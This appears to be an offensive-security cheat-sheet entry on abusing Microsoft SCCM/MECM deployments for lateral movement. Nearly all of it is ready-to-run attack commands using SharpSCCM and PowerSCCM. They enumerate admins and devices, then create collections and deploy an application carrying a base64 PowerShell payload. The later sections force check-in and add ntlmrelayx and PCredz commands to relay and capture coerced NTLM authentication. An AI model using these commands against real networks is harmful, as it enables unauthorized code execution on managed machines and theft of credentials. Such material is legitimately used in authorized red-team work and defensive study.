---
technique: SCCMDeployment
category: sccm-mecm
targets: SCCM Clients, Collections
protocols: WMI, SMB, NTLM
remote_capable: true
tags: sccm mecm deployment sharpsccm powersccm lateral-movement ntlm-relay ad
---

# SCCMDeployment

SCCM administrators can deploy applications and scripts to managed devices for lateral movement. Deployment can execute payloads directly or coerce authentication from a target device by referencing attacker-controlled UNC paths.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| SCCM rights | Application and script deployment requires SCCM administrative privileges |
| Target device | Identify a resource ID or collection containing the target |
| Listener | UNC-based coercion needs capture or relay tooling ready first |

## Windows

### SharpSCCM access check

#powershell #sharpsccm #enum

Confirm SCCM role and collection permissions before deploying.

```powershell title:"Check SCCM deployment permissions with SharpSCCM"
.\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
```
<!-- cheat -->

### SharpSCCM primary user

#powershell #sharpsccm #enum

Find devices associated with a target primary user.

```powershell title:"Find SCCM devices by primary user"
.\SharpSCCM.exe get primary-users -u "$user"
```
<!-- cheat
import users
-->

### SharpSCCM active clients

#powershell #sharpsccm #enum

List active SCCM devices with an installed client.

```powershell title:"List active SCCM client devices"
.\SharpSCCM.exe get devices -w "Active=1 and Client=1"
```
<!-- cheat -->

### SharpSCCM exec

#powershell #sharpsccm #deployment

Trigger deployment execution or UNC coercion against a specific SCCM resource ID.

```powershell title:"Trigger SCCM execution with SharpSCCM"
.\SharpSCCM.exe exec -rid $resource_id -r "$target"
```
<!-- cheat
var resource_id
var target
-->

### PowerSCCM site code

#powershell #powersccm #wmi

Find the SCCM site code on a target SCCM server.

```powershell title:"Find SCCM site code with PowerSCCM"
Find-SccmSiteCode -ComputerName "$sccm_server"
```
<!-- cheat
var sccm_server
-->

### PowerSCCM session

#powershell #powersccm #wmi

Create a PowerSCCM WMI session to the SCCM server.

```powershell title:"Create PowerSCCM WMI session"
New-SccmSession -ComputerName "$sccm_server" -SiteCode "$site_code" -ConnectionType WMI
```
<!-- cheat
var sccm_server
var site_code
-->

### PowerSCCM list computers

#powershell #powersccm #enum

List computers linked to the active SCCM session.

```powershell title:"List SCCM computers with PowerSCCM"
Get-SccmSession | Get-SccmComputer
```
<!-- cheat -->

### PowerSCCM create collection

#powershell #powersccm #collection

Create a device collection for targeted deployment.

```powershell title:"Create SCCM device collection"
Get-SccmSession | New-SccmCollection -CollectionName "$collection_name" -CollectionType "Device"
```
<!-- cheat
var collection_name
-->

### PowerSCCM add device

#powershell #powersccm #collection

Add a target computer to the deployment collection.

```powershell title:"Add device to SCCM collection"
Get-SccmSession | Add-SccmDeviceToCollection -ComputerNameToAdd "$target" -CollectionName "$collection_name"
```
<!-- cheat
var target
var collection_name
-->

### PowerSCCM create application

#powershell #powersccm #deployment

Create an SCCM application that runs a base64-encoded PowerShell payload.

```powershell title:"Create SCCM application with PowerSCCM"
Get-SccmSession | New-SccmApplication -ApplicationName "$application_name" -PowerShellB64 "$payload_b64"
```
<!-- cheat
var application_name
var payload_b64
-->

### PowerSCCM deploy application

#powershell #powersccm #deployment

Deploy the SCCM application to the target collection.

```powershell title:"Deploy SCCM application with PowerSCCM"
Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "$application_name" -AssignmentName "$assignment_name" -CollectionName "$collection_name"
```
<!-- cheat
var application_name
var assignment_name
var collection_name
-->

### PowerSCCM force checkin

#powershell #powersccm #deployment

Force devices in the collection to check for new SCCM deployments.

```powershell title:"Force SCCM device check-in"
Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "$collection_name"
```
<!-- cheat
var collection_name
-->

### PowerSCCM CMScript deployment

#powershell #powersccm #script

Deploy a PowerShell script to a target device through the Configuration Manager drive.

```powershell title:"Deploy SCCM CMScript with PowerSCCM"
New-CMScriptDeployement -CMDrive "$cm_drive" -ServerFQDN "$sccm_fqdn" -TargetDevice "$target" -Path "$script_path" -ScriptName "$script_name"
```
<!-- cheat
var cm_drive
var sccm_fqdn
var target
var script_path
var script_name
-->

## Linux

### ntlmrelayx deployment relay

#python #impacket #relay

Relay coerced SCCM deployment authentication to a target service.

```sh title:"Relay SCCM deployment authentication with ntlmrelayx"
ntlmrelayx.py -smb2support -socks -ts -ip "$lhost" -t "$relay_target"
```
<!-- cheat
import tun_ip
var relay_target
-->

### PCredz capture

#python #capture #ntlm

Capture fallback credentials while waiting for SCCM deployment authentication.

```sh title:"Capture SCCM deployment auth with PCredz"
Pcredz -i "$interface" -t
```
<!-- cheat
var interface
-->
